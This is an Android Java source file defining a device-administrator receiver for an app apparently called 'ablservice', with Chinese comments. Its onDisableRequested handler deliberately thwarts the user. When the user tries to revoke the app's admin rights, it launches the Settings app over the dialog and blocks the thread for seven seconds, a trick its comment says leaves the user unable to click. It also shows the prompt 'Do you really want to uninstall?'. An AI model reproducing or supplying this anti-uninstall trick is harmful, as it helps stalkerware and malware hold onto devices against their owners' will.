package com.hwc.ablservice.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

import com.blankj.utilcode.util.LogUtils;

/**
 * @author: hwc
 * date:   On 2020/6/8
 */
public class MyDeviceAdminReceiver extends DeviceAdminReceiver {

    private final String TAG = MyDeviceAdminReceiver.class.getSimpleName();

    /**
     * 接收到广播
     *
     * @param context
     * @param intent
     */
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        LogUtils.d(TAG, "onReceive");
    }

    /**
     * 同意
     *
     * @param context
     * @param intent
     */
    @Override
    public void onEnabled(Context context, Intent intent) {
        LogUtils.d(TAG, "onEnabled");
    }

    /**
     * 取消
     *
     * @param context
     * @param intent
     */
    @Override
    public void onDisabled(Context context, Intent intent) {
        LogUtils.d(TAG, "onDisabled");
    }

    ;

    /**
     * 用户打开了取消程序设备管理器权限的页面
     *
     * @param context
     * @param intent
     * @return 用户点击“取消设备权限时”显示的Dialog中的话术
     */
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // 特殊方式延迟阻止取消设备管理
        retuen(context, intent);
        LogUtils.d(TAG, "onDisableRequested");
        return "你真的要卸载了吗";
    }

    /**
     * 当用户触发取消程序的设备管理权限页面时，强制弹出“设置”页面，让用户无法点击
     *
     * @param context
     * @param intent
     */
    private void retuen(Context context, Intent intent) {
        Intent intent1 = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent1);
        try {
            Thread.sleep(7000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
